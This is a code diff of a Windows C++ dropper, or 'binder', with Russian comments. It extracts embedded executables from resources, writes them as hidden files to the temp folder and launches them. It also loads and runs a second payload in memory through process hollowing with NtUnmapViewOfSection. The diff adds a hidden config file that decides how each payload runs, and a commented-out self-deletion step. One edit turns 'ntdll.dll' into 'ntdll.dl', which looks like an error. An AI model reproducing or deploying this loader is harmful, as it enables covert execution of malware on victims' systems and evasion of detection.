@@ -6,45 +6,140 @@
 #include <windows.h>
 #include <exception>
 #include <shellapi.h>
+#include <string>
+#include <vector>
 
 typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
 
-bool extract(DWORD numb, LPCWSTR name)
+struct settings
+{
+public:
+	CHAR name[255];
+	BOOL temp;
+	BOOL delete_file;
+	BOOL copy_on_disk;
+	BOOL virt;
+};
+
+settings file1, file2;
+
+
+//BOOL extract(DWORD numb, LPCSTR name, BOOL del)
+BOOL extract(DWORD numb, LPCSTR name)
 {
 	try {
-		// Получаем дескриптор ресурса
-		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(numb), RT_RCDATA);
-		// грузим его в глобальную память
-		HGLOBAL mem_block = LoadResource(NULL, hRes);
-		// получаем указатель на него
-		void* pointer = LockResource(mem_block);
-		// и его размер
-		DWORD siz = SizeofResource(0, hRes);
+		HANDLE hFile;		
+		STARTUPINFO SI;
+		PROCESS_INFORMATION PI;
+		CHAR exeBuf[MAX_PATH];
+		DWORD dw;
+		std::string path;
+		SHELLEXECUTEINFO ShExecInfo = { 0 };
+		BOOL shell = FALSE;
+
+
+		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(numb), RT_RCDATA);		// Получаем дескриптор ресурса
+		HGLOBAL mem_block = LoadResource(NULL, hRes);							// грузим его в глобальную память
+		void* pointer = LockResource(mem_block);								// получаем указатель на него
+		DWORD size = SizeofResource(0, hRes);									// и его размер
 
 		//пишем в файл
-		HANDLE hFile = CreateFile(name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
+		
+		hFile = CreateFile(name, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
 		DWORD written;
-		BOOL is_extracted = WriteFile(hFile, pointer, siz, &written, NULL);
-		CloseHandle(hFile);
+		BOOL is_extracted = WriteFile(hFile, pointer, size, &written, NULL);
+ 		CloseHandle(hFile);
 		FreeResource(mem_block);
+		
+		dw = (DWORD)FindExecutable(name, NULL, exeBuf);
+		if (dw > 32) {
+			ZeroMemory(&SI, sizeof(STARTUPINFO));
+			SI.cb = sizeof(SI);
+			
+			if (std::string(exeBuf) == name)
+				path = name;
+			else
+				path = std::string(exeBuf) + " " + name;
 
-		//SHELLEXECUTEINFO ExecuteInfo;
-		//ExecuteInfo.lpFile = name;
-		//ExecuteInfo.lpParameters = L"OPEN";
-		//ExecuteInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
-		//ExecuteInfo.nShow = SW_SHOWNORMAL;
+			LPSTR s = const_cast<CHAR *>(path.c_str());
+			CreateProcess(NULL, s, NULL, NULL, FALSE, 0, NULL, NULL, &SI, &PI);
+		}
+		else
+		{
+			ZeroMemory(&SI, sizeof(STARTUPINFO));
+			SI.cb = sizeof(SI);
+			LPSTR s = const_cast<CHAR *>(name);
+			if (!CreateProcess(name, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &SI, &PI))
+				if (!CreateProcess(NULL, s, NULL, NULL, FALSE, 0, NULL, NULL, &SI, &PI))
+				{
+					ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+					ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+					ShExecInfo.hwnd = NULL;
+					ShExecInfo.lpVerb = NULL;
+					ShExecInfo.lpFile = name;
+					ShExecInfo.lpParameters = "";
+					ShExecInfo.lpDirectory = NULL;
+					ShExecInfo.nShow = SW_SHOW;
+					ShExecInfo.hInstApp = NULL;
+					ShellExecuteEx(&ShExecInfo);
+					shell = true;
+				}
+		}
 
-		//ShellExecuteEx(&ExecuteInfo);
-
-		ShellExecute(0, L"OPEN", name, NULL, NULL, SW_SHOWNORMAL);
-
+		//if (del) {
+		//	if (shell)
+		//		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
+		//	else
+		//		WaitForInputIdle(PI.hProcess, INFINITE);
+		//	Sleep(10000);
+		//	DeleteFile(name);
+		//}
 		return is_extracted;
 	}
-	catch (std::exception &e)
+	catch (...)
 	{
-		/*log(e.what());*/
 	}
 	return false;
+}
+
+void get_setings()
+{
+	try {
+		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(2000), RT_RCDATA);		// Получаем дескриптор ресурса
+		HGLOBAL mem_block = LoadResource(NULL, hRes);							// грузим его в глобальную память
+		void* pointer = LockResource(mem_block);								// получаем указатель на него
+		DWORD size = SizeofResource(0, hRes);									// и его размер
+
+		//пишем в файл
+		HANDLE hFile = CreateFile("config.ini", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
+		DWORD written;
+		WriteFile(hFile, pointer, size, &written, NULL);
+		CloseHandle(hFile);
+
+		CHAR buffer[MAX_PATH];
+		GetCurrentDirectory(sizeof(buffer), buffer);
+		std::string path = std::string(buffer) + "\\config.ini";
+
+		GetPrivateProfileString("first_file", "name", NULL, file1.name, sizeof(file1.name), path.c_str());
+		file1.temp = GetPrivateProfileInt("first_file", "temp", 0, path.c_str());
+		file1.delete_file = GetPrivateProfileInt("first_file", "delete_file", 0, path.c_str());
+		file1.virt = GetPrivateProfileInt("first_file", "virtual", 0, path.c_str());
+
+		GetPrivateProfileString("second_file", "name", NULL, file2.name, sizeof(file2.name), path.c_str());
+		file2.temp = GetPrivateProfileInt("second_file", "temp", 0, path.c_str());
+		file2.delete_file = GetPrivateProfileInt("second_file", "delete_file", 0, path.c_str());
+		file2.virt = GetPrivateProfileInt("second_file", "virtual", 0, path.c_str());
+
+		DeleteFile("config.ini");
+
+
+		FreeResource(mem_block);
+
+	}
+	catch (...)
+	{
+
+	}
 }
 
 void RunFromMemory(LPSTR szFilePath, LPVOID pFile)
@@ -79,7 +174,7 @@ void RunFromMemory(LPSTR szFilePath, LPVOID pFile)
 
 					if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
 					{
-						xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
+						xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dl"), "NtUnmapViewOfSection"));
 						xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
 					}
 
@@ -107,24 +202,55 @@ void RunFromMemory(LPSTR szFilePath, LPVOID pFile)
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
 {
 	TCHAR szFilePath[1024];
-	wchar_t buffer[100];
-	LPWSTR firstname;
+	CHAR buffer[100];
+	DWORD dwBufSize = BUFSIZ;
+	CHAR TempPath[BUFSIZ];
 
-	/*	Вложенный файл	*/
-	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
-	//Получаем дескриптор ресурса
-	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(1002), RT_RCDATA);
-	//Загружаем в глобальную память
-	HGLOBAL mem_block = LoadResource(NULL, hRes);
-	//Запускаем второй файл из памяти
-	RunFromMemory(LPSTR(szFilePath), mem_block);
+	get_setings();
+	GetTempPath(dwBufSize, TempPath);
 
-	/*	Основной файл	*/
+	/*	Первый файл	*/
+	if (file1.virt)
+	{
+		GetModuleFileNameA(0, szFilePath, 1024);
+		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(1001), RT_RCDATA);
+		HGLOBAL mem_block = LoadResource(NULL, hRes);
+		RunFromMemory(szFilePath, mem_block);
+	}
+	else
+	{
+		if (file1.temp)
+		{
+			std::string name1 = std::string(TempPath) + file1.name;
+			//extract(1001, name1.c_str(), file1.delete_file);
+			extract(1001, name1.c_str());
+		}
+		else
+			//extract(1001, file1.name, file1.delete_file);
+			extract(1001, file1.name);
+	}
 
-	//Имя первого файла
-	int res = LoadString(NULL, 2001, buffer, sizeof(buffer));
-	firstname = buffer;
-	extract(1001, firstname);
+
+	/*	Второй файл	*/
+	if (file2.virt)
+	{
+		GetModuleFileNameA(0, szFilePath, 1024);
+		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(1002), RT_RCDATA);
+		HGLOBAL mem_block = LoadResource(NULL, hRes);
+		RunFromMemory(szFilePath, mem_block);
+	}
+	else
+	{
+		if (file2.temp)
+		{
+			std::string name2 = std::string(TempPath) + file2.name;
+			//extract(1002, name2.c_str(), file2.delete_file);
+			extract(1002, name2.c_str());
+		}
+		else
+			//extract(1002, file2.name, file2.delete_file);
+			extract(1002, file2.name);
+	}
 
 	return 0;
 }
